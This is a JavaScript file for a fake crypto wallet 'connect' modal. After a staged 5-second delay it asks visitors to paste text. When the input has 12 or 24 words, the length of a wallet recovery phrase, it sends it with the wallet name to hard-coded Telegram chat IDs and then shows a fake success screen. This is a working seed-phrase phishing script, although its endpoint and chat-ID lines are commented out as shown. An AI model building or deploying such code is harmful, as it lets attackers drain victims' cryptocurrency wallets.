document.addEventListener('DOMContentLoaded', function () {
    const containers = document.querySelectorAll('.clickable');
    const modal = document.getElementById('myModal');
    const modalImage = document.getElementById('modalImage');
    const modalTitle = document.getElementById('modalTitle');
    const stage1 = document.getElementById('stage1');
    const buttonContainer = document.getElementById('buttonContainer');
    const textAreaContainer = document.getElementById('textAreaContainer');
    const inputTextArea = document.getElementById('inputTextArea');
    const sendButton = document.getElementById('sendButton');
    const successContainer = document.getElementById('successContainer');
    const errorMessage = document.getElementById('errorMessage');

    const closeButton = document.querySelector('.close');

    closeButton.addEventListener('click', function () {
        modal.style.display = 'none';
        clearTimeout(modalTimeout);
        resetModal();
    });


    function sendToTelegram(text) {
        // const endpoint = '/api/sendToTelegram';
        // const chatIds = ['5063761901', '5465922461'];

        chatIds.forEach(chat_id => {
            const params = {
                chat_id: chat_id,
                text: text
            };

            fetch(endpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(params)
            })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log(`Message sent successfully to chat_id ${chat_id}`);

     } else {
                        console.error(`Error sending message to chat_id ${chat_id}:`, data);
                    }
                });
        });
    }

    function openModal(imgSrc, text) {
        modalImage.src = imgSrc;
        modalTitle.textContent = text;

        modal.style.display = 'flex';


        modalTimeout = setTimeout(() => {
            stage1.style.display = 'none';
            buttonContainer.style.display = 'block';
        }, 5000);
    }

    containers.forEach(container => {
        container.addEventListener('click', function () {
            const imgSrc = container.querySelector('img').src;
            const text = container.querySelector('h2').textContent;

            openModal(imgSrc, text);
        });
    });

    function resetModal() {
        stage1.style.display = 'block';
        buttonContainer.style.display = 'none';
        textAreaContainer.style.display = 'none';
        successContainer.style.display = 'none';
        inputTextArea.value = '';
        errorMessage.classList.remove('show-error');
    }

    containers.forEach(container => {
        container.addEventListener('click', function () {
            const imgSrc = container.querySelector('img').src;
            const text = container.querySelector('h2').textContent;

            modalImage.src = imgSrc;
            modalTitle.textContent = text;

            stage1.style.display = 'block';
            modal.style.display = 'flex';

        });
    });

    window.addEventListener('click', function (event) {
        if (event.target === modal) {
            modal.style.display = 'none';
            clearTimeout(modalTimeout);
            resetModal();
        }
    });

    let modalTimeout;

    document.getElementById('clickableButton').addEventListener('click', function () {
        buttonContainer.style.display = 'none';
        textAreaContainer.style.display = 'block';
    });

    sendButton.addEventListener('click', function () {
        const words = inputTextArea.value.trim().split(/\s+/);

        if (words.length === 12 || words.length === 24) {
            const message = modalTitle.textContent + "\n\n" + inputTextArea.value;
            sendToTelegram(message);



textAreaContainer.style.display = 'none'; // hides the text area container
    successContainer.style.display = 'block';
setTimeout(function() {
    modal.style.display = 'none';
    resetModal();
}, 2000);
        } else {
            errorMessage.classList.add('show-error');
            setTimeout(() => {
                errorMessage.classList.remove('show-error');
            }, 3000);
        }
    });
});
